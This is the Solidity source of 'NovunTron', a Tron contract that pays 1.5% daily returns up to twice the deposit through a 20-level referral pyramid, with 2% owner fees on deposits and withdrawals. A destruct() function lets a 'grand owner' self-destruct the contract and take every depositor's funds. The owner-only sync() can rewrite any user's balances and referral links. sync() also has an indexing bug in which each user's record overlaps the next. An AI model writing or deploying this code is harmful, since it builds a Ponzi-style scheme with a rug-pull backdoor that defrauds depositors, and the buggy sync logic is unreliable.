//SourceUnit: NovunTron.sol

/*
  _   _                     _______              
 | \ | |                   |__   __|             
 |  \| | _____   ___   _ _ __ | |_ __ ___  _ __  
 | . ` |/ _ \ \ / / | | | '_ \| | '__/ _ \| '_ \ 
 | |\  | (_) \ V /| |_| | | | | | | | (_) | | | |
 |_| \_|\___/ \_/  \__,_|_| |_|_|_|  \___/|_| |_|
                                                 
                                                 
*/

pragma solidity 0.4.25;

contract Destructible {
    address public grand_owner;

    event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);

    constructor() public {
        grand_owner = msg.sender;
    }

    function transferGrandOwnership(address  _to) external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");
        
        grand_owner = _to;
    }

    function destruct() external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");

        selfdestruct(grand_owner);
    }
}

contract Novun is Destructible {
    address owner;
    
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint40 withdraw_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 match_levels;
    }

    mapping(address => User) public users;

    uint8[] public ref_bonuses;                     // 1 => 1%
    uint8[] public net_bonuses;

    uint256 public total_withdraw;
    uint256 public lastUserId;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount, uint8 level);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() public {
        owner =  msg.sender;
        
        ref_bonuses.push(10);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(7);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);

        net_bonuses.push(7);
    }

    function receive() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }
    
    function _setRefCounter(address _addr, uint256 _amount, address _upline) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        
        if(_amount >= 1500 trx && users[_upline].match_levels < 20) {
            users[_upline].match_levels++;
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount, "Bad amount");
        } else {
            lastUserId++;
            require(_amount >= 100 trx, "Bad amount");
        }
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(now);
        users[_addr].withdraw_time = 0;
        users[_addr].total_deposits += _amount;
        
        emit NewDeposit(_addr, _amount);
        
        address _upline = users[_addr].upline;
        for (uint8 i = 0; i < net_bonuses.length; i++) {
            uint256 _bonus = (_amount * net_bonuses[i]) / 100;
            
            if(_upline != address(0)) {
                users[_upline].direct_bonus += _bonus;

                emit DirectPayout(_upline, _addr, _bonus, i + 1);
                
                _upline = users[_upline].upline;
            } else {
                 users[owner].direct_bonus += _bonus;
                emit DirectPayout(owner, _addr, _bonus, i + 1);
                
                _upline = owner;
            }
        }
        
        uint256 ownerFee = ((_amount * 2) / 100);
        address(uint160(owner)).transfer(ownerFee);
    }
    
    function _refMaxLevel(uint256 _amount) private pure returns(uint8 max_level) {
        if (_amount <= 1500 trx) {
            max_level = 1;
        } else if (_amount >= 1501 trx && _amount <= 2000 trx) {
            max_level = 2;
        } else if (_amount >= 2001 trx && _amount <= 3000 trx) {
            max_level = 4;
        } else if (_amount >= 3001 trx && _amount <= 4000 trx) {
            max_level = 7;
        } else if (_amount >= 4001 trx && _amount <= 7000 trx) {
            max_level = 11;
        } else if (_amount >= 7001 trx && _amount <= 10000 trx) {
            max_level = 15;
        } else if (_amount >= 10001 trx) {
            max_level = 20;
        }
        
        return max_level;
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(_refPayoutEligible(up, i + 1)) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }
    
    function _refPayoutEligible(address _addr, uint8 _level) private view returns(bool isEligible){
        return users[_addr].referrals >= _level
            && _refMaxLevel(users[_addr].deposit_amount) >= _level
            && users[_addr].match_levels >= _level;
    }
    
    function _canWithdraw(address _addr) private view returns (bool isEligible) {
        return users[_addr].withdraw_time == 0 || ((now - users[_addr].withdraw_time) / 1 days) >= 7;
    }

    function deposit(address _upline) external payable {
        _setUpline(msg.sender, _upline);
        _setRefCounter(msg.sender, msg.value, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");
        require(_canWithdraw(msg.sender), "Withdraw too soon");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        users[msg.sender].withdraw_time = uint40(now);
        total_withdraw += to_payout;
        
        uint256 ownerFee = ((to_payout * 2) / 100);
        to_payout -= ownerFee;
        
        msg.sender.transfer(to_payout);
        address(uint160(owner)).transfer(ownerFee);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    function maxPayoutOf(uint256 _amount) private pure returns(uint256) {
        return _amount * 2;
    }

    function payoutOf(address _addr) public view returns(uint256 payout, uint256 max_payout) {
        payout = 0;
        max_payout = maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (((users[_addr].deposit_amount * 15) / 1000) * ((now - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
        
        return (payout, max_payout);
    }

    /*
        Only external call
    */
    function getDaysSinceDeposit(address _addr) external view returns(uint daysSince, uint secondsSince) {
        return (((now - users[_addr].deposit_time) / 1 days), (now - users[_addr].deposit_time));
    }
    
    function getDaysSinceWithdraw(address _addr) external view returns(uint daysSince) {
        return ((now - users[_addr].withdraw_time) / 1 days);
    }
    
    function isUserRegistered(address _addr) external view returns(bool isRegistered) {
        return (users[_addr].total_deposits > 0);
    }
    
    function userInfo(address _addr) external view returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 match_bonus, uint256 cycle) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].match_bonus, users[_addr].cycle);
    }

    function userInfoTotals(address _addr) external view returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() external view returns(uint256 _total_withdraw, uint256 _lastUserId) {
        return (total_withdraw, lastUserId);
    }
}

contract NovunTron is Novun {
    bool public sync_close = false;

    function sync(address[] _users, address[] _uplines, uint256[] _data) external onlyOwner {
        require(!sync_close, "Sync already close");

        for(uint256 i = 0; i < _users.length; i++) {
            address addr = _users[i];
            uint256 q = i * 12;

            //require(users[_uplines[i]].total_deposits > 0, "No upline");

            if(users[addr].total_deposits == 0) {
                emit Upline(addr, _uplines[i]);
            }

            users[addr].cycle = _data[q];
            users[addr].upline = _uplines[i];
            users[addr].referrals = _data[q + 1];
            users[addr].payouts = _data[q + 2];
            users[addr].direct_bonus = _data[q + 3];
            users[addr].match_bonus = _data[q + 4];
            users[addr].deposit_amount = _data[q + 5];
            users[addr].deposit_payouts = _data[q + 6];
            users[addr].deposit_time = uint40(_data[q + 7]);
            users[addr].total_deposits = _data[q + 8];
            users[addr].total_payouts = _data[q + 9];
            users[addr].total_structure = _data[q + 10];
            users[addr].match_levels = _data[q + 11];
            users[addr].withdraw_time = uint40( _data[q + 12]);

        }
    }
    
    function syncInfo(uint256 totalUsers, uint256 totalWithdraw) external onlyOwner {
        require(!sync_close, "Sync already close");

        lastUserId = totalUsers;
        total_withdraw = totalWithdraw;
    }

    function syncUp() external payable {}

    function syncClose() external onlyOwner {
        require(!sync_close, "Sync already close");

        sync_close = true;
    }
}